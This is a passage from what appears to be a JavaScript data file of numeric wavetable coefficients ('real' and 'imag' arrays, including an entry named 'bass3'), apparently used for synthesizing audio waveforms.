.000006, -.000007, .000003, -.000002, .000004, -.000006, .000004, -.000002, .000004, -.000005, .000004, -.000002, .000004, -.000006, .000003, -.000001, .000005, -.000005, .000004, -.000002, .000004, -.000004, .000003, -.000001, .000004, -.000005, .000003, -.000001, .000004, -.000004, .000003, -.000002, .000003, -.000004, .000003, -.000002, .000003, -.000004, .000003, -.000001, .000003, -.000004, .000002, -.000002, .000003, -.000003, .000002, -.000001, .000003, -.000003, .000002, -.000001, .000002, -.000003, .000002, -.000002, .000002, -.000003, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000001, .000002, -.000002, .000002, -.000001, .000002, -.000003, .000002, 0, .000002, -.000004, .000003, -.000001, .000003, -.000005, .000005, -.000003, .000004, -.000007, .000007, -.000006, .000006, -.000008, .000009, -.000008, .000007, -.000009, .00001, -.000009, .000007, -.000008, .000009, -.000009, .000007, -.000007, .000008, -.000008, .000006, -.000005, .000006, -.000007, .000005, -.000003, .000005, -.000005, .000004, -.000002, .000004, -.000004, .000003, -.000002, .000003, -.000004, .000003, -.000002, .000003, -.000004, .000003, -.000001, .000003, -.000003, .000002, -.000001, .000003, -.000003, .000002, -.000001, .000003, -.000003, .000002, -.000001, .000002, -.000003, .000002, -.000001, .000002, -.000003, .000002, -.000001, .000002, -.000003, .000002, -.000001, .000002, -.000003, .000002, -.000001, .000002, -.000003, .000002, -.000001, .000002, -.000002, .000002, -.000001, .000002, -.000002, .000002, -.000001, .000002, -.000002, .000002, -.000001, .000002, -.000002, .000001, -.000001, .000002, -.000002, .000001, -.000001, .000002, -.000002, .000001, 0, .000002, -.000002, .000001, 0, .000002, -.000002, .000001, 0, .000001, -.000002, .000001, 0, .000001, -.000002, .000001, 0, .000001, -.000002, .000001, 0, .000001, -.000002, .000001, 0, .000001, -.000002, .000001, 0, .000001, -.000002, .000001, 0, .000001, -.000002, .000001, 0, .000001, -.000002, .000001, 0, .000001, -.000002, .000001, 0, .000001, -.000002, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, .000001, 0, .000001, -.000001, 0, 0, .000001, -.000001, 0, 0, .000001, -.000001, 0, 0, .000001, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ],  imag: [ 0, .5, -.000001, 0, -.000001, .000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, 0, .000001, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ] } ],
	[ "bass3",       { real: [ 0, -.087481, -.008727, .015668, -.000741, -.002277, -.0016, -.00405, -.001203, -.003604, -.001386, -.00309, -.001163, -.002088, -.001024, -.001233, -.000737, -.000601, -.000461, -.00017, -.000188, -.000004, -.000007, .000086, .000105, .00005, .000133, .000031, .000092, -.000011, .00004, -.000004, -.000029, -.000005, -.000058, .000015, -.000067, .000019, -.000047, .000027, -.000011, .000016, .000018, .000004, .000032, .000002, .000031, -.000006, .000013, -.000011, -.000003, -.000012, -.000019, -.000015, -.000031, -.00001, -.00002, -.000009, -.000014, -.00001, .000004, .000001, .000013, .000001, .000017, .000008, .000019, .000009, .000012, .000008, .000005, .000005, .000001, .000008, -.000007, -.000004, 0, -.000006, -.000001, -.000002, .000002, -.000002, .000005, .000004, .000004, .000009, .000002, .000008, .000003, .000009, .000004, .000006, -.000001, .000001, .000002, -.000002, 0, -.000005, .000001, -.000002, 0, -.000004, .000002, 0, .000002, .000004, .000003, .000006, .000005, .000007, .000003, .000005, .000002, -.000002, .000001, -.000002, 0, -.000001, -.000004, -.000003, .000004, 0, .000001, -.000001, 0, .000005, 0, .000003, .000001, .000002, .000005, .000001, -.000002, .000001, .000003, 0, -.000002, 0, -.000002, 0, 0, .000003, .000001, .000003, .000001, .000003, .000005, .000001, .000003, .000003, .000002, .000001, .000003, .000001, 0, .000002, .000001, .000002, 0, .000004, -.000001, -.000002, .000002, -.000001, 0, .000003, .000002, .000002, .000001, .000001, .000002, -.000001, .000002, .000002, .000003, .000002, .000002, .000002, -.000003, .000002, -.000001, -.000001, .000001, .000002, .000001, .000001, -.000001, .000002, .000003, .000002, 0, .000003, .000001, 0, 0, .000002, .000001, .000003, .000001, -.000001, .000004, 0, .000001, -.000001, .000001, -.000002, -.000001, .000002, -.000001, .000002, .000001, 0, 0, .000001, 0, .000001, -.000001, .000001, 0, -.000001, 0, -.000001, .000003, -.000001, .000002, .000001, 0, 0, -.000002, -.000001, .000001, 0, -.000001, 0, .000002, .000002, .000002, .000001, -.000001, -.000002, .000002, -.000001, .000005, .000003, .000002, .000002, 0, -.000001, -.000001, 0, .000003, -.000002, .000003, .000001, .000002, 0, 0, .000005, 0, .000001, 0, .000001, .000001, 0, -.000002, .000003, 0, .000001, .000001, -.000001, .000001, .000004, 0, 0, .000002, .000002, .000002, 0, 0, -.000002, .000001, 0, .000002, .000002, .000002, .000002, .000005, .000002, -.000002, .000003, 0, .000001, .000002, .000002, -.000002, -.000002, .000002, .000003, 0, -.000001, .000004, -.000001, .000002, -.000003, 0, .000003, -.000001, .000002, .000003, .000001, 0, .000005, .000002, 0, 0, .000001, .000001, .000001, 0, 0, .000003, .000001, .000001, .000003, 0, .000004, .000004, .000001, .000001, -.000001, .000002, .000002, .000001, .000001, .000003, 0, .000003, .000001, .000001, .000002, .000005, .000001, .000004, .000004, .000002, .000003, .000004, .000002, .000003, -.000001, .000002, 0, .000001, 0, .000002, 0, 0, 0, .000001, 0, -.000001, -.000001, 0, -.000001, -.000002, -.000001, -.000002, -.000001, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 